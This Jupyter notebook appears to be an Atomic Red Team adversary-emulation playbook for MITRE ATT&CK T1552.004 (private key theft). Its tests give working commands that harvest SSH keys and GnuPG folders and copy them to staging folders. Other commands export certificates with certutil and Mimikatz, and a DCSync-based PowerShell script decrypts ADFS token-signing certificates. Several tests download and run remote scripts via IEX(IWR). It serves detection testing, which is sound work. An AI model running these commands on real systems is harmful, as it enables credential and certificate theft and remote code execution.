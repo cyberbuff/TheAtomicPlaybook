{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "3c760708",
   "metadata": {},
   "source": "# T1552.004 - Private Keys\nAdversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \n\nAdversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.\n\nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)\n\nSome private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line."
  },
  {
   "cell_type": "markdown",
   "id": "2f52df5e",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "b0975c5a",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Private Keys",
    "Find private keys on the Windows file system.\nFile extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ndir c:\\ /b /s .key | findstr /e .key\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5c1f25d4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "5b469384",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Discover Private SSH Keys",
    "Discover private SSH keys on a macOS or Linux system.\n",
    "**Supported Platforms:** macos, linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nfind / -name id_rsa 2>/dev/null >> /tmp/keyfile_locations.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b15846a3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "ecbdd3c1",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm /tmp/keyfile_locations.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "651f0048",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "56f9abaa",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Copy Private SSH Keys with CP",
    "Copy private SSH keys on a Linux system to a staging folder using the `cp` command.\n",
    "**Supported Platforms:** linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nmkdir /tmp/art-staging\nfind / -name id_rsa 2>/dev/null -exec cp --parents {} /tmp/art-staging \\;\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "44534999",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "4165152e",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -rf /tmp/art-staging\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ab0b1b8f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "b85b578a",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Copy Private SSH Keys with rsync",
    "Copy private SSH keys on a Linux or macOS system to a staging folder using the `rsync` command.\n",
    "**Supported Platforms:** macos, linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nmkdir /tmp/art-staging\nfind / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \\;\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a865ded9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "63cbbd07",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -rf /tmp/art-staging\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "efb7b390",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "52a4f41f",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Copy the users GnuPG directory with rsync",
    "Copy the users GnuPG (.gnupg) directory on a Mac or Linux system to a staging folder using the `rsync` command.\n",
    "**Supported Platforms:** macos, linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nmkdir /tmp/GnuPG\nfind / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \\;\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "60d5d3fb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "88d15478",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -rf /tmp/GnuPG\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a825ea61",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a6eb3914",
   "metadata": {},
   "source": "### Atomic Test #6 - ADFS token signing and encryption certificates theft - Local\nRetrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: AADInternals module must be installed.\n\n##### Check Prereq Commands:\n```powershell\nif (Get-Module AADInternals) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AADInternals -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cfa89cf5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "7a24314a",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module AADInternals -Force\nExport-AADIntADFSCertificates\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7d14c2dc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "66322a25",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore\nRemove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "93c3d842",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c19668cf",
   "metadata": {},
   "source": "### Atomic Test #7 - ADFS token signing and encryption certificates theft - Remote\nRetrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: AADInternals and ActiveDirectory modules must be installed.\n\n##### Check Prereq Commands:\n```powershell\nif ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable -Name ActiveDirectory)) {echo 0} else {echo 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AADInternals -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bb5f6051",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "a990912f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module ActiveDirectory -Force \nImport-Module AADInternals -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"adfs_svc\"\n$PWord = ConvertTo-SecureString -String \"ReallyStrongPassword\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList Administrator, $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server sts.contoso.com\n# Get certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne() \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted certificates from configuration and decrypt them\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "26c4176c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "9e9be565",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore\nRemove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e881e471",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "61c2c647",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - CertUtil ExportPFX",
    "The following Atomic test simulates adding a generic non-malicious certificate to the Root certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog. In addition, this Atomic utilizes CertUtil to export the PFX (ExportPFX), similar to what was seen in the Golden SAML attack.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\nReference: https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nIEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \ncertutil.exe -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 c:\\temp\\atomic.pfx\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d9d5a485",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "95b30e58",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nGet-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item \n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b20723a7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "1f7a0345",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Export Root Certificate with Export-PFXCertificate",
    "Creates a Root certificate and exports it with Export-PFXCertificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-PFXCertificate.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$mypwd = ConvertTo-SecureString -String \"AtomicRedTeam\" -Force -AsPlainText\n$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nSet-Location Cert:\\LocalMachine\\My\nGet-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath $env:Temp\\atomicredteam.pfx -Password $mypwd\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "96950ccb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "2756c820",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\ntry {\n$cert = Import-Certificate -FilePath $env:Temp\\atomicredteam.pfx -CertStoreLocation Cert:\\LocalMachine\\My\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\nGet-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n} catch { }\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "54b91611",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9b263d4b",
   "metadata": {},
   "source": [
    "### Atomic Test #10 - Export Root Certificate with Export-Certificate",
    "Creates a Root certificate and exports it with Export-Certificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-Certificate.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nSet-Location Cert:\\LocalMachine\\My\nExport-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath $env:Temp\\AtomicRedTeam.cer\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "84f518aa",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "adbb2988",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\ntry {\n   $cert = Import-Certificate -FilePath $env:Temp\\AtomicRedTeam.cer -CertStoreLocation Cert:\\LocalMachine\\My -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n}\ncatch { }\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bac7504d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 10 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "27e65618",
   "metadata": {},
   "source": "### Atomic Test #11 - Export Certificates with Mimikatz\nThe following Atomic test will utilize Mimikatz to extract the certificates from the local system My store. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\nA successful attempt will stdout the certificates and write multiple .pfx and .der files to disk.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path PathToAtomicsFolder\\T1003.001\\bin\\x64\\mimikatz.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path PathToAtomicsFolder\\T1003.001\\bin\\x64\\mimikatz.exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6b92b442",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 11 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "791ace2c",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nPathToAtomicsFolder\\T1003.001\\bin\\x64\\mimikatz.exe \"crypto::certificates /systemstore:local_machine /store:my /export\"  exit\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ef016f3c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1552.004 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "a18e4510",
   "metadata": {},
   "source": "## Detection\nMonitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}